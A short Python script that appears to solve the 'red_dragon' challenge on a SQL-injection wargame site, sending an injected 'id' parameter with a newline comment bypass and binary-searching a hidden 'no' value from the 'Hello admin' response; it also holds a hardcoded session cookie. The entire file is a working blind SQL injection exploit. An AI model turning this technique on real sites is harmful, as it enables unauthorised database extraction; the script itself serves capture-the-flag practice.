import requests

session = requests.Session()
cookies = {"PHPSESSID": "5s5vfpd5jpkhskvvl1f1t1nk6m"}


url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id='||no>%23&no=%0A"
mini = 100000000
maxi = 1000000000
while(maxi > mini):
    mid = int((maxi+mini)//2)
    r = requests.get(url+str(mid), cookies=cookies)
    if('Hello admin' in r.text[:150]):
        print("no>"+str(mid))
        if(maxi-mini > 1):
            mini = mid
        else:
            maxi = mini
    else:
        print("no<"+str(mid))
        maxi = mid
print(mid)